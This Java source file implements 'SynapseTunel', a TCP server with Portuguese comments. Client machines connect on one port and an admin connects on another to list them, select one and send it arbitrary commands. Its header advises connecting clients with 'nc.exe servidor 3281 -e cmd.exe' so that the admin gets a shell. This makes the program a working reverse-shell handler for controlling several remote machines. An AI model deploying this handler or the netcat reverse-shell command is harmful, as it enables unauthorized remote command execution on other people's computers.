/*
 * SynapseTunel - Tunel TCP/IP em Java
 * -----------------------------------
 * Os clientes se conectam na porta 3281
 * O administrador conecta na porta 3282
 * Comandos do Administrador:
 *    lsm         - lista as maquinas clientes conectadas
 *    connect:1   - conecta na maquina de índice 1, por exemplo.
 *    disconnect  - desconecta da maquina cliente
 *    remove:1    - desconecta e remove maquina cliente
 *    info        - retorna informacao da conexao atual
 * Dica: 
 * Conectar o cliente ao SynapseTunel da seguinte forma:
 * > nc.exe servidor 3281 -e cmd.exe
 * Assim o admin cai na shell ao conectar na maquina cliente :)
 * ---
 * Ivan S. Vargas
 * contato@is5.com.br
 */
package synapsetunel;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * @author Ivan Vargas
 */
public class SynapseTunel {

    /**
     * @param args the command line arguments
     */
    
    private int IdCliente = -1;
    
    private ArrayList<Maquina> maquinas = new ArrayList();
    private ServerSocket ClienteServer, AdminServer;
    private Socket ClienteSocket, AdminSocket;
    
    private DataInputStream inAdmin = null;
    private OutputStreamWriter outAdmin = null;
    
    synchronized public void addMaquina(Socket client) {
        boolean vinculada = false;
        
        /* procura na lista se nao tinha uma maquina com mesmo IP e Hostname. Se tiver... vincula o socket... */
        for(Maquina m : maquinas) {
            if( (m.getIp().equals(client.getInetAddress().getHostAddress())) && (m.getNome().equals(client.getInetAddress().getHostName())) ) {
                try {
                    m.getCliente().close();
                    m.setCliente(client);
                    vinculada = true;
                    break;
                } catch (Exception ex) {
                    vinculada = false;
                    System.out.println("Erro ao vincular socket.");
                }
            }
        }
        
        /* ... do contrario, adiciona */
        if(!vinculada) {
            Maquina m = new Maquina(client);
            m.setID(maquinas.size());
            m.setAlias(m.getID() + " - " + m.getIp());
            maquinas.add(m);
        }
    }
    
    synchronized public void removeMaquina(Integer IdMaquina) {
        for(Maquina m : maquinas) {
            try
            {
                if (m.getID() == IdMaquina) {
                    m.getCliente().close();
                    maquinas.remove(m);
                }
            }catch(Exception ex) {
                System.out.println("Erro ao remover maquina: " + ex.getMessage());
            }
        }
    }
    
    
    public SynapseTunel(){
        new ClienteServerConnect().start();
        new AdminServerConnect().start();
    }
    
    public static void main(String[] args) {
        // TODO code application logic here
        new SynapseTunel();
    }
    
    class ClienteServerConnect extends Thread {
        
        public void run() {
            try {
                ClienteServer = new ServerSocket(3281);
                
                System.out.println("Servidor de Clientes iniciado na porta 3281.\nAguardando conexao.");
                
                while(true) 
                {
                    ClienteSocket = ClienteServer.accept();
                    System.out.println("Cliente conectado no servidor.");
                
                    ClienteThread ct = new ClienteThread(ClienteSocket);
                    ct.start();
                }               
                
            } catch (Exception ex) {
                System.out.println("Erro ao iniciar servidor de clientes: " + ex.getMessage());
            }
        }
    }
    
    class ClienteThread extends Thread {
        
        private Socket client;
        
        public ClienteThread(Socket client) {
            this.client = client;
            addMaquina(this.client);
        }
        
        public void run() {
            
            try {
                
                DataInputStream in = new DataInputStream(client.getInputStream());
                OutputStreamWriter outw = new OutputStreamWriter(client.getOutputStream());
                int data;
                String resposta = null;
                StringBuffer buffer = new StringBuffer();
                while (true) 
                {
                    while ((data = in.read()) != 10)
                    {
                        buffer.append((char) data);
                    } 
                    resposta = buffer.toString();
                    buffer.delete(0, buffer.length());
                    System.out.println(resposta);
                    if (outAdmin != null) 
                    {
                        outAdmin.write(resposta+"\n\r");
                        outAdmin.flush();
                    }                    
                }           
                
            }catch(Exception ex) {
                System.out.println("Erro em cliente: " + ex.getMessage());
            }          
            
        }
    }
    
    class AdminServerConnect extends Thread {
        
        public void run() {
            try {
                AdminServer = new ServerSocket(3282);
                
                System.out.println("Servidor Admin iniciado na porta 3282.\nAguardando conexao.");
                
                while(true) 
                {
                    AdminSocket = AdminServer.accept();
                    System.out.println("Admin conectado no servidor.");
                
                    AdminThread at = new AdminThread(AdminSocket);
                    at.start();
                }               
                
            } catch (Exception ex) {
                System.out.println("Erro ao iniciar servidor de clientes: " + ex.getMessage());
            }
        }
		
    }
    
    class AdminThread extends Thread {
        
        private Socket admin;
        private StringBuffer buffer = new StringBuffer();
        private int data;
        
        public AdminThread(Socket admin) {
            this.admin = admin;
        }
        
        private String getMaquinas() {
            String s = "";
            if (maquinas.size() > 0) {
                for(Maquina m : maquinas) {
                    s += m.getAlias() + "\n";
                }
            }
            if(s.isEmpty())
                s = "Nenhuma maquina conectada neste momento.";                 
            return s;
        }
        
        private boolean Send(String mensagem) 
        {
            try 
            {
                outAdmin.write(mensagem.trim()+"\n\r");
                outAdmin.flush();
                return true;
            } catch (Exception ex) {
                System.out.println("Erro ao enviar mensagem: " + ex.getMessage());
                return false;
            }
        }
        
        private Maquina getMaquinaPorId(int ID) {
            Maquina maquina = null;
            for(Maquina m : maquinas) {
                if(m.getID() == ID) {
                    maquina = m;
                }
            }
            return maquina;
        }

        private String Received() 
        {
            try 
            {                
                while ((data = inAdmin.read()) != 10) 
                {
                    buffer.append((char) data);
                }
                String s = buffer.toString();
                buffer.delete(0, buffer.length());  
                return s;
            } catch (Exception ex) {
                System.out.println("Erro ao receber mensagem: " + ex.getMessage());
                return null;
            }
        }
        
        private boolean SendComandoPorMaquina(Maquina m, String cmd) {
            try {
                OutputStreamWriter out = new OutputStreamWriter(m.getCliente().getOutputStream());
                out.write(cmd+"\n\r");
                out.flush();
                return true;
            }catch(Exception ex) {
                System.out.println("Erro ao enviar comando para maquina: " + ex.getMessage());
                Send("Erro");
                return false;
            }
        }
        
        public void run() {
            try {
                inAdmin = new DataInputStream(admin.getInputStream());
                outAdmin = new OutputStreamWriter(admin.getOutputStream());
                
                String cmd = "";
                
                Send("************************************************\n"
                   + "             BEM VINDO AO SYNAPSE               \n"
                   + "************************************************\n\n");
                
                while(true) 
                {
                    cmd = Received().replace('\n', ' ').replace('\r', ' ').trim();
                    
                    System.out.println("Recebido: " + cmd);
                    
                    if (cmd.toLowerCase().startsWith("lsm")) {
                        String lm = getMaquinas();
                        System.out.println("Maquinas: " +lm);
                        Send(lm);                        
                    } else if (cmd.toLowerCase().startsWith("connect:")) {
                        try {
                            IdCliente = Integer.parseInt(cmd.substring(8, cmd.length()));
                            SendComandoPorMaquina(getMaquinaPorId(IdCliente), "hostname");

                        } catch (Exception ex) {
                            IdCliente = -1;
                            System.out.println("Erro ao conectar no cliente: " + ex.getMessage());
                            Send("Erro ao conectar no cliente.");
                        }
                    }
                    else if (cmd.toLowerCase().startsWith("disconnect")) {
                        IdCliente = -1;
                        Send("Desconectado da maquina remota.");
                    }
                    else if (cmd.toLowerCase().startsWith("remove:")) {
                        try {
                            int id = Integer.parseInt(cmd.substring(7, cmd.length()));
                            removeMaquina(id);

                        } catch (Exception ex) {
                            System.out.println("Erro ao remover maquina: " + ex.getMessage());
                            Send("Maquina removida.");
                        }
                    }
                    else if (cmd.toLowerCase().startsWith("info")) {
                        String info = "";
                        if(IdCliente > -1) {
                            info += "\nVoce esta conectado na maquina: " + IdCliente;
                            info += "\nEndereco IP: " + getMaquinaPorId(IdCliente).getIp();
                            info += "\nHostname: " + getMaquinaPorId(IdCliente).getNome();
                            Send(info);
                        }
                        else
                            Send("Voce nao esta conectado em nenhuma maquina");
                        
                    }
                    else {
                        if (IdCliente > -1) {
                           SendComandoPorMaquina(getMaquinaPorId(IdCliente), cmd); 
                        }
                    }
                    
                }				
                
            }catch(Exception ex) {
                System.out.println("Erro ao Admin: " + ex.getMessage());
            }
        }
        
    }
    
}
